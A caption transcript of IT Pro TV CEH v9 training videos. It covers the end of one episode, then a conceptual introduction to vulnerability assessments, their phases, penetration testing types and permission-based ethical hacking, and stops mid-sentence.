00:41:43.190\nAnother great look at some of\nthe information we need to.\n\n862\n00:41:43.190 --> 00:41:47.770\nEstablish and be familiar with, as we\nmove on through our CEH gonna look at\n\n863\n00:41:47.770 --> 00:41:50.820\ninformation security controls, or at\nleast where we can find information about\n\n864\n00:41:50.820 --> 00:41:53.510\nthe controls that we might or\nmight not want to implement.\n\n865\n00:41:53.510 --> 00:41:56.570\nAlso take a look at\ninformation security laws, and\n\n866\n00:41:56.570 --> 00:41:59.500\nsome of the standards that are available,\nthat we can go out there and get, and\n\n867\n00:41:59.500 --> 00:42:03.160\nsome great look at places like sans where\nwe can, if we have to write policies,\n\n868\n00:42:03.160 --> 00:42:05.290\nwe don't know where to start,\nthere's templates available.\n\n869\n00:42:05.290 --> 00:42:07.470\nThe point is, there's resources out there.\n\n870\n00:42:07.470 --> 00:42:11.460\nWe as CEA just need to be aware\nthey they are out there and\n\n871\n00:42:11.460 --> 00:42:12.650\nknow where to go to find them.\n\n872\n00:42:12.650 --> 00:42:14.200\nWe thank you for that,\nAdam, appreciate it.\n\n873\n00:42:14.200 --> 00:42:16.100\nWe hope everybody out\nthere enjoyed watching.\n\n874\n00:42:16.100 --> 00:42:18.800\nSigning off for\nIT Pro TV I'm Mike Roderick\n\n875\n00:42:18.800 --> 00:42:19.660\n>> I'm Adam Gordon\n\n876\n00:42:19.660 --> 00:42:22.347\n>> And we'll see you next time.\n\n877\n00:42:22.347 --> 00:42:23.200\n[MUSIC]\n\n",

00:00:16.830\nI'm your host Mike Roderick.\n\n4\n00:00:16.830 --> 00:00:19.067\nToday, we're doing CEH version 9.\n\n5\n00:00:19.067 --> 00:00:20.882\nAnd specifically in this episode,\n\n6\n00:00:20.882 --> 00:00:24.870\nwe're gonna be getting into that\nfirst phase in our hacking lifecycle.\n\n7\n00:00:24.870 --> 00:00:26.980\nThat footprinting and reconnaissance.\n\n8\n00:00:26.980 --> 00:00:28.985\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n9\n00:00:28.985 --> 00:00:29.915\nHow're you doing, Adam?\n\n10\n00:00:29.915 --> 00:00:30.665\n>> Good, good.\n\n11\n00:00:30.665 --> 00:00:31.665\nAre we talking about footprinting?\n\n12\n00:00:31.665 --> 00:00:33.085\nCan I put my socks up?\n\n13\n00:00:33.085 --> 00:00:34.275\n>> Absolutely.\nCan you get them up there?\n\n14\n00:00:34.275 --> 00:00:35.195\n>> I can't hold them up that far.\n\n15\n00:00:35.195 --> 00:00:37.345\nSo it's impossible to see because\nI blend into the background.\n\n16\n00:00:37.345 --> 00:00:42.115\nBut I'm doing a line theme this week on\nsocks, so all my socks have lines on them.\n\n17\n00:00:42.115 --> 00:00:45.715\nI'll try to match them to the lines\non my shirt when possible.\n\n18\n00:00:45.715 --> 00:00:48.805\nSo I've got a theme going on for\nfootprinting.\n\n19\n00:00:48.805 --> 00:00:50.625\nSee the whole thing developing.\n\n20\n00:00:50.625 --> 00:00:51.692\n>> I like it.\n\n21\n00:00:51.692 --> 00:00:52.552\n>> Yeah, whatever.\n\n22\n00:00:52.552 --> 00:00:54.205\nIt's all lost on most people, anyway.\n\n23\n00:00:54.205 --> 00:00:55.765\n>> [LAUGH]\n>> So let's talk about footprinting and\n\n24\n00:00:55.765 --> 00:00:56.640\nreconnaissance.\n\n25\n00:00:56.640 --> 00:01:01.090\nBut by the way doing it, let's step back,\nand let's actually start by reviewing\n\n26\n00:01:01.090 --> 00:01:04.480\nsome of the things we have been talking\nabout in some of our prior episodes.\n\n27\n00:01:04.480 --> 00:01:08.610\nWe've been talking in the introductory\nseries about just setting the foundational\n\n28\n00:01:08.610 --> 00:01:12.590\nknowledge, defining a lot of vocabulary,\nlaying out some terms,\n\n29\n00:01:12.590 --> 00:01:16.860\nthinking in broad strokes about\nconcepts like policies and\n\n30\n00:01:16.860 --> 00:01:19.780\nsenior management buy in,\nthings like that.\n\n31\n00:01:19.780 --> 00:01:23.910\nAnd as a result,\nwe wanna also remind ourselves,\n\n32\n00:01:23.910 --> 00:01:30.700\nwe did talk about the phases of you going\nthrough and thinking about not just,\n\n33\n00:01:30.700 --> 00:01:35.770\nlet's say interacting with a system,\nbut gathering information, scanning,\n\n34\n00:01:35.770 --> 00:01:40.030\ngoing in and gaining access,\nmaintaining access, covering our tracks.\n\n35\n00:01:40.030 --> 00:01:44.559\nBut we also wanna talk about the ways\nin which vulnerability assessments, and\n\n36\n00:01:44.559 --> 00:01:48.745\nsome of the other things around this\nidea of scanning and interacting and\n\n37\n00:01:48.745 --> 00:01:49.996\nhacking take place.\n\n38\n00:01:49.996 --> 00:01:53.968\nBecause we have to build that knowledge\nup to then go backwards and try to think\n\n39\n00:01:53.968 --> 00:01:58.510\nabout foot printing and interacting in\nthis way stepping through methodically.\n\n40\n00:01:58.510 --> 00:02:00.610\nSo what is a vulnerability\nassessment is probably a really good\n\n41\n00:02:00.610 --> 00:02:02.000\nquestion to ask ourselves.\n\n42\n00:02:02.000 --> 00:02:05.483\nAnd we wanna be comfortable with and\nknowledgeable about the answer or\n\n43\n00:02:05.483 --> 00:02:08.741\nquestion like this is a CEA,\njust a certified ethical hacker..\n\n44\n00:02:08.741 --> 00:02:10.513\nIt's very important for us to know,\n\n45\n00:02:10.513 --> 00:02:13.340\nthis is one of the most\nimportant things we will do.\n\n46\n00:02:13.340 --> 00:02:16.910\nAs ethical hackers do\nassessments on systems\n\n47\n00:02:16.910 --> 00:02:20.710\nwith senior management permission and\nwith senior management knowledge, but\n\n48\n00:02:20.710 --> 00:02:23.920\nwe will go through and\nwe will probe and push and prod and\n\n49\n00:02:23.920 --> 00:02:29.120\ntest the boundaries of what the security\ncontrols are, see where the strengths are.\n\n50\n00:02:29.120 --> 00:02:33.520\nBut also hopefully if done correctly and\nif they exist, uncover the weaknesses,\n\n51\n00:02:33.520 --> 00:02:37.450\nhence the concept of the vulnerability\nassessment, the weakness assessment.\n\n52\n00:02:37.450 --> 00:02:42.090\nIf we substitute the definitional term\nthat we gave you on our vocabulary list\n\n53\n00:02:42.090 --> 00:02:45.600\nfor vulnerability as a weakness,\nwe're really doing a weakness assessment.\n\n54\n00:02:45.600 --> 00:02:47.430\nThat's what a vulnerability assessment is.\n\n55\n00:02:47.430 --> 00:02:49.620\nWe have to look at the strengths,\nin other words,\n\n56\n00:02:49.620 --> 00:02:51.510\nto understand where the weaknesses are.\n\n57\n00:02:51.510 --> 00:02:53.680\nAnd so, we wanna think about that and\nunderstand that.\n\n58\n00:02:53.680 --> 00:02:58.730\nA vulnerability assessment helps\nus to understand the architecture,\n\n59\n00:02:58.730 --> 00:03:02.370\nbut also, if done correctly, should\nlook at not just the system design, but\n\n60\n00:03:02.370 --> 00:03:05.110\nthe operational environment\nthe system exists in.\n\n61\n00:03:05.110 --> 00:03:06.340\nThe context, in other words,\n\n62\n00:03:06.340 --> 00:03:10.100\nof the usage of that system in\nrelation to others should be examined.\n\n63\n00:03:10.100 --> 00:03:13.030\nThe makeup of that system itself,\nthe baseline.\n\n64\n00:03:13.030 --> 00:03:15.260\nWhat is the software that is installed?\n\n65\n00:03:15.260 --> 00:03:17.510\nWhat are the default settings?\n\n66\n00:03:17.510 --> 00:03:18.700\nAre we aligned?\n\n67\n00:03:18.700 --> 00:03:21.630\nIs that baseline standardized and frozen?\n\n68\n00:03:21.630 --> 00:03:24.570\nIs it in flux, and dynamic, and changing?\n\n69\n00:03:24.570 --> 00:03:25.590\nDo we have control over it?\n\n70\n00:03:25.590 --> 00:03:26.860\nDo we know what it is?\n\n71\n00:03:26.860 --> 00:03:28.570\nHow many of us out there think about this?\n\n72\n00:03:28.570 --> 00:03:30.076\nAnd Mike, I know you and\nI have talked about this in the past.\n\n73\n00:03:30.076 --> 00:03:30.633\n>> Mm-hm.\n\n74\n00:03:30.633 --> 00:03:34.395\n>> Think about how many of us know what\nthe actual baseline is of a system\n\n75\n00:03:34.395 --> 00:03:38.223\nunderneath or in or network,\nthat we in theory, are responsible for\n\n76\n00:03:38.223 --> 00:03:40.230\nmonitoring and maintaining.\n\n77\n00:03:40.230 --> 00:03:43.980\nIf I came to you right now and your\nnetworks for instance, and as an auditor,\n\n78\n00:03:43.980 --> 00:03:49.230\nI said to you, can you tell me Mr.\nMike, or John, or Joe, or Jamie,\n\n79\n00:03:49.230 --> 00:03:54.140\nor Sarah, whoever it is out there,\ncan you tell me whether or\n\n80\n00:03:54.140 --> 00:03:56.080\nnot the baseline that you expect and\n\n81\n00:03:56.080 --> 00:04:00.990\nindeed feel based on documentation is\nindeed in play should be what I find?\n\n82\n00:04:00.990 --> 00:04:06.170\nWill I, in other words, when I go randomly\nand sample the system, will it be that way\n\n83\n00:04:06.170 --> 00:04:11.160\nor am I gonna find some sort of variance,\nsome sort of deviation from our baseline?\n\n84\n00:04:11.160 --> 00:04:14.360\nAnd you may not know quite honestly, and\nif you think about this honestly and\n\n85\n00:04:14.360 --> 00:04:18.390\ndispassionately, and you're able to\ndivorce yourself from that gut reaction,\n\n86\n00:04:18.390 --> 00:04:19.820\nwell, of course, it's gonna be that way.\n\n87\n00:04:19.820 --> 00:04:20.800\nIt's my system.\n\n88\n00:04:20.800 --> 00:04:22.680\nHow could it not be that way?\n\n89\n00:04:22.680 --> 00:04:23.770\nWrong, right?\n\n90\n00:04:23.770 --> 00:04:26.870\nWell, more often than not\nit will not be that way.\n\n91\n00:04:26.870 --> 00:04:28.796\nIf you could think about\nit dispassionately and\n\n92\n00:04:28.796 --> 00:04:31.790\nyou can look me in the eye, and\ntell me, honestly, Adam, I'm not sure.\n\n93\n00:04:31.790 --> 00:04:33.663\nI'm gonna have a lot more respect for\n\n94\n00:04:33.663 --> 00:04:37.834\nyou as a security professional than if you\ntried to tell me that you unabashedly and\n\n95\n00:04:37.834 --> 00:04:41.300\n100% unequivocally believe\nthat it's gonna be the case.\n\n96\n00:04:41.300 --> 00:04:45.000\nUnless you can demonstrate for me that\nyou've got all the proper procedures,\n\n97\n00:04:45.000 --> 00:04:49.850\nprocesses, policies, and systems in\nplace to validate that baseline.\n\n98\n00:04:49.850 --> 00:04:51.570\nYou're doing continuous monitoring.\n\n99\n00:04:51.570 --> 00:04:55.070\nYou're doing ongoing vulnerability\nassessment and penetration testing.\n\n100\n00:04:55.070 --> 00:04:57.840\nYou're doing random system checks,\nin other words,\n\n101\n00:04:57.840 --> 00:05:01.880\nthroughout the lifecycle of that system,\nfrom a variety of different approaches and\n\n102\n00:05:01.880 --> 00:05:06.970\nperspectives that will validate the fact\nthat that baseline is indeed in place.\n\n103\n00:05:06.970 --> 00:05:09.280\nIf you're not doing that it's pretty\nhard to look me in the eye and\n\n104\n00:05:09.280 --> 00:05:12.380\ntell me that you think you know what\nthe outcome's gonna be because I'm pretty\n\n105\n00:05:12.380 --> 00:05:15.550\nconfident that I know what the outcome's\ngonna be, that you're gonna be wrong and\n\n106\n00:05:15.550 --> 00:05:17.930\nI'm usually right when\nit comes to that stuff.\n\n107\n00:05:17.930 --> 00:05:19.430\nBut again,\nif you can look me in the eye and\n\n108\n00:05:19.430 --> 00:05:22.860\ntell me unequivocally, yeah and\nhere's why, here's the three or\n\n109\n00:05:22.860 --> 00:05:26.620\nfour things we do,\nI'm gonna go with you on that, no problem.\n\n110\n00:05:26.620 --> 00:05:31.130\nI'm the first one to be happy to say\nthat I'm glad that that's not the case.\n\n111\n00:05:31.130 --> 00:05:33.120\nI don't wanna be right, let me be clear.\n\n112\n00:05:33.120 --> 00:05:34.980\nI would like to be wrong.\n\n113\n00:05:34.980 --> 00:05:36.730\nIt's a challenge, prove me wrong.\n\n114\n00:05:36.730 --> 00:05:38.730\nMost people don't, that's the problem.\n\n115\n00:05:38.730 --> 00:05:41.580\nMost people are not doing\nthe things they need to do.\n\n116\n00:05:41.580 --> 00:05:44.800\nSo vulnerability assessments,\nvery important.\n\n117\n00:05:44.800 --> 00:05:45.830\nWhy do we do them?\n\n118\n00:05:45.830 --> 00:05:47.060\nIdentify weaknesses and\n\n119\n00:05:47.060 --> 00:05:51.090\nalso predict the effectiveness of\nthe security controls we put in place, and\n\n120\n00:05:51.090 --> 00:05:55.340\nthe effectiveness of additional\ncontrols that will be placed over time.\n\n121\n00:05:55.340 --> 00:05:58.950\nTwo very important reasons why we\nengage in vulnerability assessments.\n\n122\n00:05:58.950 --> 00:06:01.130\nWhat type of vulnerability\nassessments exist?\n\n123\n00:06:01.130 --> 00:06:03.480\nThere are a whole plethora.\n\n124\n00:06:03.480 --> 00:06:06.580\nIt's a great term, you should use it\nmore often when you talk to people.\n\n125\n00:06:06.580 --> 00:06:09.203\nIt's a lot of fun to say,\nrolls right off the tongue.\n\n126\n00:06:09.203 --> 00:06:12.280\nKind of like, I don't know digitalis.\n\n127\n00:06:12.280 --> 00:06:14.970\n>> [LAUGH]\n>> So plethora, active assessments,\n\n128\n00:06:14.970 --> 00:06:18.925\npassive assessments, external assessments,\ninternal assessments,\n\n129\n00:06:18.925 --> 00:06:23.480\nhost-base assessments, wireless\nnetwork assessments, application based\n\n130\n00:06:23.480 --> 00:06:28.870\nassessments, need I go on, we can assess\nany and everything about our network.\n\n131\n00:06:28.870 --> 00:06:31.700\nAny kind of system can be\nvulnerability assessed.\n\n132\n00:06:31.700 --> 00:06:36.220\nEvery system, in theory, has strengths,\nand as a result, should have weaknesses.\n\n133\n00:06:36.220 --> 00:06:39.160\nWe may not know what they are,\nand they may not be important.\n\n134\n00:06:39.160 --> 00:06:41.200\nBut if we don't document them and\ncatalog them and\n\n135\n00:06:41.200 --> 00:06:44.100\nunderstand them,\nhow can we possibly manage them?\n\n136\n00:06:44.100 --> 00:06:45.470\nAnd if we're not managing them,\n\n137\n00:06:45.470 --> 00:06:49.670\nhow can we possibly say we're doing\nour job as security professionals?\n\n138\n00:06:49.670 --> 00:06:50.930\nThere's no good way to do that,\n\n139\n00:06:50.930 --> 00:06:54.600\nat least no argument that I've seen\nthat makes sense to me in my world.\n\n140\n00:06:54.600 --> 00:06:57.680\nWhen we think about network vulnerability\nassessments just as one approach,\n\n141\n00:06:57.680 --> 00:07:01.090\none example on our way to\ntalking about footprinting.\n\n142\n00:07:01.090 --> 00:07:04.210\nWhen we think about the methodology\ninvolved, what are the steps?\n\n143\n00:07:04.210 --> 00:07:05.461\nWhat do we need to know how to do?\n\n144\n00:07:05.461 --> 00:07:07.330\nIt's very important.\n\n145\n00:07:07.330 --> 00:07:11.820\nWhenever we can lay out definitive steps\nin a process and document stages and\n\n146\n00:07:11.820 --> 00:07:13.880\nunderstand what they are, then we do so.\n\n147\n00:07:13.880 --> 00:07:17.350\nIt gives everybody, who's involved,\nthe ability to understand what to do when,\n\n148\n00:07:17.350 --> 00:07:19.150\nit gives us the ability\nto understand whether or\n\n149\n00:07:19.150 --> 00:07:21.820\nnot we're acting in the right\nway at the right time.\n\n150\n00:07:21.820 --> 00:07:25.470\nAnd of course, as always, just to be fair,\nfrom an exam perspective,\n\n151\n00:07:25.470 --> 00:07:28.200\nit gives us great opportunity to\ndemonstrate our knowledge, and\n\n152\n00:07:28.200 --> 00:07:31.780\nto ask questions about things that\nthe professional that's looking\n\n153\n00:07:31.780 --> 00:07:34.950\nto claim this knowledge and\nmake it their own, should understand.\n\n154\n00:07:34.950 --> 00:07:38.175\nIn other words, it would be helpful for\nyou to understand the phases and\n\n155\n00:07:38.175 --> 00:07:41.185\nthe steps involved in some of these\nprocesses as we go to the trouble\n\n156\n00:07:41.185 --> 00:07:42.451\nof laying them out for you.\n\n157\n00:07:42.451 --> 00:07:45.386\nIt would be helpful for you to prepare for\nthe exam by knowing them and\n\n158\n00:07:45.386 --> 00:07:46.466\nyou may get asked, hey,\n\n159\n00:07:46.466 --> 00:07:49.727\nwhat is step three of the network\nassessment vulnerability methodology?\n\n160\n00:07:49.727 --> 00:07:52.095\nWe'll talk about that in a minute,\nit's analyzing.\n\n161\n00:07:52.095 --> 00:07:55.940\nSo you wanna understand what these\nphases are, or steps are, in order.\n\n162\n00:07:55.940 --> 00:07:57.566\nVery important to capture those.\n\n163\n00:07:57.566 --> 00:08:01.320\nPhase one of the network vulnerability\nassessment methodology is acquisition.\n\n164\n00:08:01.320 --> 00:08:04.530\nSounds suspiciously like a lot of\nthe other beginning places we have\n\n165\n00:08:04.530 --> 00:08:06.120\ntalked about starting from.\n\n166\n00:08:06.120 --> 00:08:09.220\nGo out and collect all\nthe background information we need.\n\n167\n00:08:09.220 --> 00:08:11.540\nFigure out what the current\nstate of affairs is.\n\n168\n00:08:11.540 --> 00:08:15.560\nCan't get to where we wanna go unless we\nknow where we are in order to start out,\n\n169\n00:08:15.560 --> 00:08:16.540\nas they say.\n\n170\n00:08:16.540 --> 00:08:17.900\nPhase two, identification.\n\n171\n00:08:17.900 --> 00:08:21.160\nConduct interviews,\ngather technical information,\n\n172\n00:08:21.160 --> 00:08:24.260\ntalk to people about the stuff\nthat you've acquired in phase one.\n\n173\n00:08:24.260 --> 00:08:27.160\nValidate it to make sure\nthat it is legitimately\n\n174\n00:08:27.160 --> 00:08:28.850\nthe actual thing that you're seeing.\n\n175\n00:08:28.850 --> 00:08:31.350\nYou're being told that\nthat is what's happening.\n\n176\n00:08:31.350 --> 00:08:33.180\nPhase three, we wanna analyze.\n\n177\n00:08:33.180 --> 00:08:36.680\nTake all that information,\nturn it around examine it,\n\n178\n00:08:36.680 --> 00:08:38.830\nput it in the turn it upside down.\n\n179\n00:08:38.830 --> 00:08:43.370\nSee what it means and then gather it up in\nsuch a way that we can distill it down and\n\n180\n00:08:43.370 --> 00:08:44.180\nreport on it.\n\n181\n00:08:44.180 --> 00:08:47.780\nMake it something that is\nunderstandable or consumable by others.\n\n182\n00:08:47.780 --> 00:08:53.050\nYou looking at 200 data points\nwith a misconfigured and\n\n183\n00:08:53.050 --> 00:08:55.400\nor mismatched set of information.\n\n184\n00:08:55.400 --> 00:08:59.230\nAnd then distilling value is not that same\nthing as presenting that coherently and\n\n185\n00:08:59.230 --> 00:09:03.265\ncogently to senior management in\nsome sort of consumable format.\n\n186\n00:09:03.265 --> 00:09:07.090\nI.e through a dashboard,\nthrough some sort of report, a slide show.\n\n187\n00:09:07.090 --> 00:09:08.480\nI don't know, whatever you may do.\n\n188\n00:09:08.480 --> 00:09:13.400\nBut the point is do something like that so\nothers around you can understand that.\n\n189\n00:09:13.400 --> 00:09:17.080\nSo phase four will be\nevaluation after we analyze to\n\n190\n00:09:17.080 --> 00:09:20.070\nessentially gather everything up and\nmake sure it's good.\n\n191\n00:09:20.070 --> 00:09:22.880\nAnd phase five, as I mentioned,\nis generating reports.\n\n192\n00:09:22.880 --> 00:09:26.470\nSo we wanna go through and\nmake sure we understand the five phases.\n\n193\n00:09:26.470 --> 00:09:29.300\nMake sure we're comfortable\nwith them from a network\n\n194\n00:09:29.300 --> 00:09:31.080\nvulnerability assessment perspective.\n\n195\n00:09:31.080 --> 00:09:34.803\nWe can apply [INAUDIBLE] same five phases\nto almost any kind of vulnerability\n\n196\n00:09:34.803 --> 00:09:35.710\nassessment.\n\n197\n00:09:35.710 --> 00:09:39.420\nIt's very important to think about those\nstages, make sure we understand them.\n\n198\n00:09:39.420 --> 00:09:41.980\nWe've talked to you about some\nof the places you can go to find\n\n199\n00:09:41.980 --> 00:09:43.170\ninformation and guidance.\n\n200\n00:09:43.170 --> 00:09:46.070\nAnd engage in vulnerability\nresearch on line.\n\n201\n00:09:46.070 --> 00:09:48.465\nMike's done a great job on\nhelping us to put those up and\n\n202\n00:09:48.465 --> 00:09:50.513\nmake sure you have those URL's.\n\n203\n00:09:50.513 --> 00:09:52.000\n[INAUDIBLE] just wanna make\nsure we're aware of them but\n\n204\n00:09:52.000 --> 00:09:57.375\n[INAUDIBLE] lot's of different sites out\nthere, we've talked about the legal sites.\n\n205\n00:09:57.375 --> 00:09:59.545\nSites that give you legal guidance for\nISO standards,\n\n206\n00:09:59.545 --> 00:10:03.640\nthings like that but things like going out\nand looking at dark reading for instance,\n\n207\n00:10:03.640 --> 00:10:07.190\nI don't know if you're familiar with dark\nreading, but dark reading is a great\n\n208\n00:10:07.190 --> 00:10:11.100\nsite where you can get a lot of\ninformation from the security perspective,\n\n209\n00:10:11.100 --> 00:10:12.970\nfrom the security practitioner.\n\n210\n00:10:12.970 --> 00:10:15.710\nThey put out weekly newsletters and\nupdates.\n\n211\n00:10:15.710 --> 00:10:19.740\nUsed to be an underground site, it's\nbecome a lot more mainstream these days,\n\n212\n00:10:19.740 --> 00:10:23.690\nbut you can go out and\nlook at the Hackerstorm website.\n\n213\n00:10:23.690 --> 00:10:26.290\nHackerstorm is great site out of the UK,\n\n214\n00:10:26.290 --> 00:10:31.890\nthat'll be Hackerstorn.co.uk, right, so\nif you wanna just go and pull that one up.\n\n215\n00:10:31.890 --> 00:10:35.910\nThings like Computerworld,\nsome of the great publications out there.\n\n216\n00:10:35.910 --> 00:10:39.710\nS C Magazine, a security magazine,\nsecurity computing magazine,\n\n217\n00:10:39.710 --> 00:10:43.070\nthese are all trade sites or\nsites that are commercially available, but\n\n218\n00:10:43.070 --> 00:10:45.350\nthey have a wealth of\ninformation out there.\n\n219\n00:10:45.350 --> 00:10:47.090\nSo a lot of these would be helpful for\nyou.\n\n220\n00:10:47.090 --> 00:10:49.020\nWe've talked about going out to NIST.\n\n221\n00:10:49.020 --> 00:10:53.320\nWe've talked about taking a look at\nthe SANS site, SANS Reading Room.\n\n222\n00:10:53.320 --> 00:10:54.410\nThings like that.\n\n223\n00:10:54.410 --> 00:10:57.355\nAll or any of these sites that Mike\nhas put out would be helpful for you.\n\n224\n00:10:57.355 --> 00:11:00.040\nHackerstorm blogspot would\nbe a good one as well.\n\n225\n00:11:00.040 --> 00:11:02.950\nWe wanna also think about pen testing,\npenetration testing.\n\n226\n00:11:02.950 --> 00:11:06.795\nYet another kind of assessment or\ntest we wanna think about and engage in.\n\n227\n00:11:06.795 --> 00:11:08.460\nWe've talked a lot about this.\n\n228\n00:11:08.460 --> 00:11:10.650\nA method of evaluating the information.\n\n229\n00:11:10.650 --> 00:11:14.380\nSecurity handling procedures and\nmechanisms on a network to understand\n\n230\n00:11:14.380 --> 00:11:18.700\nwhether or not they are up to speed and\nif so great if not, can we break in?\n\n231\n00:11:18.700 --> 00:11:21.280\nVery important to be thinking\nabout these things when they wanna\n\n232\n00:11:21.280 --> 00:11:25.300\nsimulate an attack to see if we can\nfind susceptibility to vulnerabilities,\n\n233\n00:11:25.300 --> 00:11:28.065\nif we're doing this ethically,\nif we're not doing it ethically, well,\n\n234\n00:11:28.065 --> 00:11:31.365\nthen we are really attacking and,\nta-dah, there we are, right?\n\n235\n00:11:31.365 --> 00:11:32.225\nAnd we get in, so\n\n236\n00:11:32.225 --> 00:11:35.705\nwe wanna make sure we understand\nthe concept of pen testing, as well.\n\n237\n00:11:35.705 --> 00:11:36.515\nRemember, again,\n\n238\n00:11:36.515 --> 00:11:41.290\nthe idea is we have permission, we\nare probing the outer rim of the network.\n\n239\n00:11:41.290 --> 00:11:43.940\nWe are then working our way\nin to see how far we can get.\n\n240\n00:11:43.940 --> 00:11:46.620\nRemember, white hat,\nblack hat, gray hat hacking.\n\n241\n00:11:46.620 --> 00:11:49.620\nWe may or may not be on the right\nside of that equation, right?\n\n242\n00:11:49.620 --> 00:11:52.500\nWe can think about full knowledge,\npartial knowledge,\n\n243\n00:11:52.500 --> 00:11:55.730\nzero knowledge testing,\nsame kinds of concepts.\n\n244\n00:11:55.730 --> 00:11:58.720\nDo we have complete understanding and\ncomplete awareness or\n\n245\n00:11:58.720 --> 00:12:02.900\nare we going in blind and trying to figure\nout what we can find and what we can see?\n\n246\n00:12:02.900 --> 00:12:07.060\nWe pen test for a variety of reasons,\nwe wanna understand that.\n\n247\n00:12:07.060 --> 00:12:08.548\nI wanna understand that pen test,\n\n248\n00:12:08.548 --> 00:12:11.230\nit could be use to validate\nassumptions about architecture.\n\n249\n00:12:11.230 --> 00:12:15.350\nIt could be used to validate assumptions\nabout foot printing and reconnaissance.\n\n250\n00:12:15.350 --> 00:12:18.520\nIt could be used to put knowledge\ninto play, and see whether or\n\n251\n00:12:18.520 --> 00:12:19.865\nnot that knowledge is still accurate.\n\n252\n00:12:19.865 --> 00:12:23.475\nCould be looked for or used for\nto find vulnerabilities.\n\n253\n00:12:23.475 --> 00:12:27.485\nThere's a large variety of reasons why pen\ntesting and vulnerability assessments and\n\n254\n00:12:27.485 --> 00:12:29.455\nsecurity audits are all valuable.\n\n255\n00:12:29.455 --> 00:12:35.790\nBut remember, security audits are gonna be\nessentially a non-invasive process check,\n\n256\n00:12:35.790 --> 00:12:40.180\nand non-invasive policy check,\nto validate what we are doing, and\n\n257\n00:12:40.180 --> 00:12:43.960\nwhether what we have said we are doing\nis what we actually are implementing.\n\n258\n00:12:43.960 --> 00:12:47.650\nBut we don't actually break in and\ngo active, in other words,\n\n259\n00:12:47.650 --> 00:12:50.290\nto probe the defenses,\nwhen we do a security audit.\n\n260\n00:12:50.290 --> 00:12:52.622\nWe may,\nas I said in certain circumstances,\n\n261\n00:12:52.622 --> 00:12:55.160\nlink and\naudit to a vulnerability assessment or\n\n262\n00:12:55.160 --> 00:12:59.380\na pen test to validate controls\non the ground through activity.\n\n263\n00:12:59.380 --> 00:13:02.630\nBut a generic security audit is\nnot implied that we're hacking\n\n264\n00:13:02.630 --> 00:13:03.730\nto validate controls.\n\n265\n00:13:03.730 --> 00:13:06.370\nIt implies that we are looking\nat documentation and\n\n266\n00:13:06.370 --> 00:13:09.090\nrandomly sampling system configurations.\n\n267\n00:13:09.090 --> 00:13:10.320\nSo it's usually passive.\n\n268\n00:13:10.320 --> 00:13:13.792\nWe wanna make sure we are aware of that,\na vulnerability assessment and or\n\n269\n00:13:13.792 --> 00:13:17.790\na pen test is gonna look at very\nspecific elements of the architecture,\n\n270\n00:13:17.790 --> 00:13:20.180\nprobing statically and dynamically.\n\n271\n00:13:20.180 --> 00:13:23.740\nIn other words, passively and\nactively to go in a see whether or\n\n272\n00:13:23.740 --> 00:13:26.740\nnot those things that we assume\nare happening indeed are.\n\n273\n00:13:26.740 --> 00:13:30.050\nIt's very important for\nus to differentiate between those\n\n274\n00:13:30.050 --> 00:13:33.050\nin order to understand the value\nultimately of foot printing.\n\n275\n00:13:33.050 --> 00:13:36.590\nYou may heard of things like blue team,\nred team exercises.\n\n276\n00:13:36.590 --> 00:13:38.910\nYou may have heard of\ntiger team exercises.\n\n277\n00:13:38.910 --> 00:13:42.635\nAll these different terms we often use\nto be able to engage in these activities\n\n278\n00:13:42.635 --> 00:13:44.965\ndepending on whether you're in\nthe military, in the government,\n\n279\n00:13:44.965 --> 00:13:47.065\nprivate sector where you've worked.\n\n280\n00:13:47.065 --> 00:13:48.925\nMilitary usually talks about blue team,\n\n281\n00:13:48.925 --> 00:13:52.485\nred team exercise that's\npretty popular concept there.\n\n282\n00:13:52.485 --> 00:13:55.540\nThey've got hacking teams that\nare dedicated to go out and\n\n283\n00:13:55.540 --> 00:13:58.490\nplay capture the flag essentially and\ntake over systems.\n\n284\n00:13:58.490 --> 00:14:02.230\nThey randomly will just spot check you,\neverything's going along fine all of\n\n285\n00:14:02.230 --> 00:14:06.440\na sudden you've got a breach and\nthis is a red team exercise that or\n\n286\n00:14:06.440 --> 00:14:10.920\nsomebody is running to be able to see\nwhether or not your standard config is\n\n287\n00:14:10.920 --> 00:14:15.250\ndesigned to restrict and therefore prevent\nthis kind of attack based on the guidance\n\n288\n00:14:15.250 --> 00:14:17.800\nthat has been given to you, and how you're\nsupposed to implement your systems.\n\n289\n00:14:17.800 --> 00:14:20.770\nThis is happening all the time,\nin many many systems today.\n\n290\n00:14:20.770 --> 00:14:24.240\nIt's very common, and\nit's one of those things that, again,\n\n291\n00:14:24.240 --> 00:14:25.550\nwe should be thinking about.\n\n292\n00:14:25.550 --> 00:14:29.260\nWith regards to foot printing and\nreconnaissance, this kind of activity\n\n293\n00:14:29.260 --> 00:14:32.860\nis evidence of the fact that we're\nconstantly looking and probing.\n\n294\n00:14:32.860 --> 00:14:36.600\nRemember, when we think about pen testing\nwe could think about black box, white box,\n\n295\n00:14:36.600 --> 00:14:40.190\nor gray box, just like black hat,\nwhite hat, and grey hat hacking.\n\n296\n00:14:40.190 --> 00:14:45.100\nWe can think about black box, white box\nand or gray box testing, sometimes often\n\n297\n00:14:45.100 --> 00:14:49.270\nreferred to as I said as full knowledge,\npartial knowledge or zero knowledge.\n\n298\n00:14:49.270 --> 00:14:52.770\nSo when we think about black box testing,\nwe're thinking about zero knowledge\n\n299\n00:14:52.770 --> 00:14:56.950\ntesting, we are given literally just\nan agreement from senior management,\n\n300\n00:14:56.950 --> 00:15:00.530\na handshake that says, yes,\nwe'd like you to attack this system.\n\n301\n00:15:00.530 --> 00:15:02.540\nYou have two weeks to do it.\n\n302\n00:15:02.540 --> 00:15:06.490\nMaybe, in theory, we're told\nthe external IP that may be about it.\n\n303\n00:15:06.490 --> 00:15:08.320\nWe may not even be told that.\n\n304\n00:15:08.320 --> 00:15:10.520\nWe may just be given\nthe name of the company.\n\n305\n00:15:10.520 --> 00:15:14.540\nWe may be given essentially a statement\nthat says you're not supposed to do\n\n306\n00:15:14.540 --> 00:15:17.570\nthese things, what is in scope,\nwhat is out of scope, in other words.\n\n307\n00:15:17.570 --> 00:15:22.650\nVery important when we do pen testing and\nhacking activities that we have guidance.\n\n308\n00:15:22.650 --> 00:15:24.810\nEven if it's a zero knowledge test.\n\n309\n00:15:24.810 --> 00:15:26.650\nThat we have guidance\nabout what is off limits.\n\n310\n00:15:26.650 --> 00:15:31.580\nBecause you're hacking in to production\nsystems that are connected to live data\n\n311\n00:15:31.580 --> 00:15:36.150\nand if you hack the wrong system,\nyou may actually break the system 